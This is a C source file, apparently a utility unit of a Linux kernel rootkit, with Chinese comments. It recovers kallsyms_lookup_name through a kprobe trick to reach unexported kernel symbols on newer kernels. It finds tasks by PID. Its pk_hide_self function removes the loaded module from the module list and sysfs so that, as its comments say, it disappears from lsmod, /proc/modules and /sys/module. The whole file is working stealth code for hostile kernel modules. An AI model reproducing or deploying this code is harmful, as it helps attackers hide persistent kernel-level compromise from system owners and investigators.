/* util.c */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/kobject.h>
#include "util.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long pk_kln_addr;
static int pk_kln_probe(struct kprobe *p, struct pt_regs *regs) { return 0; }

unsigned long pk_lookup_name(const char *name)
{
    struct kprobe kp;
    int ret;

    if (pk_kln_addr)
        return ((unsigned long (*)(const char *))pk_kln_addr)(name);

    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kp);
    if (ret < 0)
        return 0;

    pk_kln_addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    (void)pk_kln_probe;

    if (!pk_kln_addr)
        return 0;
    return ((unsigned long (*)(const char *))pk_kln_addr)(name);
}
#else
unsigned long pk_lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

struct task_struct *pk_task_by_pid(__u32 pid)
{
    struct pid *p;
    struct task_struct *t;

    p = find_get_pid(pid);
    if (!p)
        return NULL;

    t = get_pid_task(p, PIDTYPE_PID);
    put_pid(p);
    return t;   /* 调用方负责 put_task_struct */
}

int pk_hide_self(const char *modname)
{
    struct module *m;

    if (!THIS_MODULE)
        return -1;

    m = THIS_MODULE;

    /* 1) 从模块双向链表摘除, /proc/modules 与 lsmod 立刻消失 */
    if (!list_empty(&m->list)) {
        list_del_init(&m->list);
    }

    /* 2) 摘 kobject, /sys/module/<name> 消失 */
    if (m->mkobj.kobj.state_in_sysfs) {
        kobject_del(&m->mkobj.kobj);
        m->mkobj.kobj.state_in_sysfs = 0;
    }

    /* 3) 清掉 /proc/modules 里残留的版本/名字指纹 */
    m->name[0] = '\0';   /* 只是让后续枚举拿不到名字, 不影响已解析的符号 */

    pr_debug("%s: %s hidden\n", __func__, modname ? modname : "self");
    return 0;
}

int pk_hide_kallsyms(void)
{
    return 0;
}
